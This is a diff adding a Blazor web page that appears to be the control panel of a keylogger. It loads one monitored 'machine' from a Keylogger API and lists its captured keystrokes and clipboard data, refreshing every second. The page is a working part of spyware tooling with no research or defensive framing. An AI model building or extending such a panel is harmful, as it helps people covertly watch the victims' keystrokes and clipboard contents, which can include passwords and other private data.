@@ -1,0 +1,113 @@
+@page "/machine/{id:int}"
+@using Microsoft.AspNetCore.Authorization
+@using Microsoft.AspNetCore.Components.WebAssembly.Authentication
+@using Server.Shared
+@using System.Threading
+@attribute [Authorize]
+@inject HttpClient Http
+
+<h1>Machine</h1>
+
+@if (machine == null)
+{
+    <p><em>Loading...</em></p>
+}
+else
+{
+    <p><b>Key: </b>@machine.Key</p>
+    <p><b>Name: </b>@machine.Name</p>
+    <p><b>Logs: </b>@machine.Logs</p>
+    <p><b>Online: </b>@machine.Online</p>
+    <p>
+        <b>Desc: </b>
+        <textarea class="w-100">
+            @machine.Description
+        </textarea>
+    </p>
+    <p>
+        @if (logs == null || !logs.Any())
+        {
+        <p><em>Loading...</em></p>
+    }
+    else
+    {
+        <button type="button" class="btn btn-primary" @onclick="Refresh">Refresh</button>
+        <table class="table table-borderless table-hover">
+            <thead>
+                <tr>
+                    <th>Date</th>
+                    <th>Keys</th>
+                </tr>
+                <tr>
+                    <th></th>
+                    <th>Clipboard</th>
+                </tr>
+            </thead>
+            <tbody>
+                @foreach (var log in logs)
+                {
+                    var data = log.KeyPresses.FirstOrDefault(k => k.DataType.HasValue && k.Data != null)?.Data;
+                    <tr>
+                        <td>@log.KeyPresses.Max(k => k.To)</td>
+                        <td>@string.Join(" + ", log.KeyPresses.Select(k => k.Key.ToString()))</td>
+                    </tr>
+                    @if (data != null)
+                    {
+                        <tr>
+                            <td></td>
+                            <td>@data.ToString()</td>
+                        </tr>
+                    }
+                }
+            </tbody>
+        </table>
+        <button type="button" class="btn btn-primary" @onclick="Refresh">Refresh</button>
+    }
+        </p>
+    }
+
+@code {
+    private Server.Shared.Machine machine;
+    private Server.Shared.KeyPressSet[] logs;
+
+    [Parameter] public int Id { get; set; }
+
+    protected override async Task OnInitializedAsync()
+    {
+        try
+        {
+            machine = await Http.GetFromJsonAsync<Server.Shared.Machine>($"Keylogger/Machine/{Id}");
+            logs = await Http.GetFromJsonAsync<Server.Shared.KeyPressSet[]>($"Keylogger/Machine/{Id}/Logs");
+        }
+        catch (AccessTokenNotAvailableException exception)
+        {
+            exception.Redirect();
+        }
+
+        // auto refresh
+        var timer = new Timer(new TimerCallback(async _ =>
+        {
+            await Refresh();
+    
+            // Note that the following line is necessary because otherwise
+            // Blazor would not recognize the state change and not refresh the UI
+            await InvokeAsync(() =>
+            {
+                StateHasChanged();
+            });
+        }), null, 1000, 1000);
+    }
+
+    protected async Task Refresh()
+    {
+        try
+        {
+            logs = await Http.GetFromJsonAsync<Server.Shared.KeyPressSet[]>($"Keylogger/Machine/{Id}/Logs");
+        }
+        catch (AccessTokenNotAvailableException exception)
+        {
+            exception.Redirect();
+        }
+    }
+
+}
